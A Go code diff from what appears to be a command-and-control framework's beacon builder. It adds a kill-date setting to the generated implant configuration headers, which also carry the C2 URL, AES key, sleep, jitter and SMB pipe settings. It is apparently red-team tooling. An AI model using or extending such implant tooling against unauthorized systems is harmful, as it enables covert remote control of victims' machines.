@@ -87,7 +87,7 @@ func writeIfChanged(path string, data []byte) error {
 // generateConfigH produces the main Config.h (readable, small) and returns it.
 // generateProfileH produces the separate Config_profile.h (large WRITE macro).
 // Both are called by BuildPayload and written to src_beacon/include/.
-func generateConfigH(host string, port int, path string, key []byte, sleepMs uint32, jitterPct uint32, profileBytes []byte, watermark uint32, listenerWatermark uint32, gateAPIs []string, ssl bool) []byte {
+func generateConfigH(host string, port int, path string, key []byte, sleepMs uint32, jitterPct uint32, killDate uint32, profileBytes []byte, watermark uint32, listenerWatermark uint32, gateAPIs []string, ssl bool) []byte {
 	if len(key) != 16 {
 		panic(fmt.Sprintf("generateConfigH: key must be 16 bytes, got %d", len(key)))
 	}
@@ -114,6 +114,9 @@ func generateConfigH(host string, port int, path string, key []byte, sleepMs uin
 	fmt.Fprintf(&buf, " *   C2 URL:   %s\n", url)
 	fmt.Fprintf(&buf, " *   AES Key:  %s\n", keyHex)
 	fmt.Fprintf(&buf, " *   Sleep:    %d ms   Jitter: %d%%\n", sleepMs, jitterPct)
+	if killDate != 0 {
+		fmt.Fprintf(&buf, " *   KillDate: %d (unix UTC)\n", killDate)
+	}
 	if len(profileBytes) > 0 {
 		fmt.Fprintf(&buf, " *   Profile:  v2, %d bytes\n", len(profileBytes))
 	}
@@ -123,6 +126,7 @@ func generateConfigH(host string, port int, path string, key []byte, sleepMs uin
 	// Scalar defines
 	fmt.Fprintf(&buf, "#define NAX_SLEEP_MS    %du\n", sleepMs)
 	fmt.Fprintf(&buf, "#define NAX_JITTER_PCT  %du\n", jitterPct)
+	fmt.Fprintf(&buf, "#define NAX_KILL_DATE   %du\n", killDate)
 	buf.WriteString("#define NAX_SID_LEN     17u\n")
 	fmt.Fprintf(&buf, "#define NAX_WATERMARK   0x%08Xu\n", watermark)
 	fmt.Fprintf(&buf, "#define NAX_LISTENER_WM 0x%08Xu\n\n", listenerWatermark)
@@ -197,7 +201,7 @@ func generateProfileH(profileBytes []byte) []byte {
 
 // generateSmbConfigH produces Config.h for the SMB transport variant.
 // No profile embedding - SMB child uses raw pipe framing, not HTTP malleable profile.
-func generateSmbConfigH(pipeName string, key []byte, sleepMs uint32, jitterPct uint32, watermark uint32, listenerWatermark uint32, gateAPIs []string) []byte {
+func generateSmbConfigH(pipeName string, key []byte, sleepMs uint32, jitterPct uint32, killDate uint32, watermark uint32, listenerWatermark uint32, gateAPIs []string) []byte {
 	if len(key) != 16 {
 		panic(fmt.Sprintf("generateSmbConfigH: key must be 16 bytes, got %d", len(key)))
 	}
@@ -215,6 +219,7 @@ func generateSmbConfigH(pipeName string, key []byte, sleepMs uint32, jitterPct u
 
 	fmt.Fprintf(&buf, "#define NAX_SLEEP_MS    %du\n", sleepMs)
 	fmt.Fprintf(&buf, "#define NAX_JITTER_PCT  %du\n", jitterPct)
+	fmt.Fprintf(&buf, "#define NAX_KILL_DATE   %du\n", killDate)
 	buf.WriteString("#define NAX_SID_LEN     17u\n")
 	fmt.Fprintf(&buf, "#define NAX_WATERMARK   0x%08Xu\n", watermark)
 	fmt.Fprintf(&buf, "#define NAX_LISTENER_WM 0x%08Xu\n\n", listenerWatermark)
